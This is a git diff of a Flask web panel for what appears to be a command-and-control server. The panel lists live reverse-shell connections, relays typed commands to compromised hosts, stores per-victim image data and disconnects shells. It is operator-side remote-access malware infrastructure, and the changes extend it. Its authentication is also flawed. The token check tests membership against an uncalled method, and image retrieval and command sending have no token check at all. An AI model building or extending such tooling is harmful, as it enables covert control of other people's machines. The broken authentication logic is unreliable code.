@@ -5,6 +5,7 @@ from .FlskServerTools.user import User
 from .FlskServerTools.Dbactions import LoginDB
 from flask_login import *
 from secrets import token_urlsafe
+from Tools.toolsF import getJsonKey
 
 
 class FlskSevrev(object):
@@ -21,7 +22,9 @@ class FlskSevrev(object):
         self._ruleResetor()
         self.login_manager = LoginManager()
         self.login_manager.init_app(self.app)
+        self.login_manager.login_view = 'loginPage'
         self.login_manager.user_loader(self.load_user)
+
 
     def load_user(self, user_id):
         if self.dbaction.user_exists(user_id):
@@ -29,21 +32,41 @@ class FlskSevrev(object):
         return None
 
     def loginPage(self):
+        if current_user.is_authenticated:
+            return redirect(url_for('homePage'))
         return render_template("Login.html")
     
     def logout(self):
         logout_user()
         return redirect(url_for('loginPage'))
     
-    def _getKey(dct, key, default=None):
-        if isinstance(dct, dict):
-            return dct.get(key, default)
-        return default
+    def _valid_token(self,token):
+        return token in self.c2Server.connections.keys
+    
+    def sendImage(self):
+        if not self._valid_token(getJsonKey(request.headers,'Bearer token',None)):
+            return jsonify({'status': 'Requiere valid token'}), 401
+        data = request.get_json()
+        Type = getJsonKey(data,'type', None)
+        ip = getJsonKey(data,'ip', None)
+        baseData = getJsonKey(data,'data',None)
+        if Type is  None or Type != "img" or baseData is None or ip is None:
+           return jsonify({'status': 'Error occurred - bad request'}), 403
+        conobj = self.c2Server.connections.getConnObj(ip)
+        conobj.commandManager.image = baseData
+        return jsonify({'status': 'completed'})
+    
+    def getImage(self):
+        ip = getJsonKey(request.get_json(),'ip',None)
+        if ip is None:
+           return jsonify({'data': 'Error occurred - bad request'}), 403
+        connObj = self.c2Server.connections.getConnObj(ip)
+        return jsonify({'data':connObj.commandManager.image})
 
     def signUp(self):
         data = request.get_json()
-        username = self._getKey(dct=data,key='username',default='')
-        password = self._getKey(dct=data,key='password',default='')
+        username = getJsonKey(dct=data,key='username',default='')
+        password = getJsonKey(dct=data,key='password',default='')
         if not self.dbaction.insert_user(username, password):
             return jsonify({"message": "Sign Up successful"})
         return jsonify({"message": "Something went wrong while processing your request"}), 401
@@ -61,11 +84,13 @@ class FlskSevrev(object):
                 return jsonify({"message": "Invalid username or password"}), 401
         return self.loginPage()
     
+
     def getshellChat(self,hostname):
         if self.c2Server.connections.isconnected(hostname):
             return render_template('ChatBox.html',hostname=hostname)
         return make_response("Page not found", 404)
     
+
     def shellPage(self):
         return render_template('ChatBox.html')
  
@@ -86,20 +111,17 @@ class FlskSevrev(object):
     def send_message(self):
         data = request.get_json()
         connObj = self.c2Server.connections.getConnObj(data['ip'])
-        msg = self.c2Server.retriveCommand(connObj,data['message'])
+        msg = connObj.commandManager.retriveCommand(data['message'])
         return {'message': msg}
     
    
     def closeShell(self):
         data = request.get_json()
-        connObj = self.c2Server.connections.getConnObj(data['ip'])
-        self.c2Server.sendMsg(connObj,b'exit')
         self.c2Server.connections.disconnect(data['ip'])
         return {'Status':"Disconnect"}
     
     
     def listShellConnections(self):
-        print(self.c2Server.connections.getShellConntions())
         return self.c2Server.connections.getShellConntions()
 
 
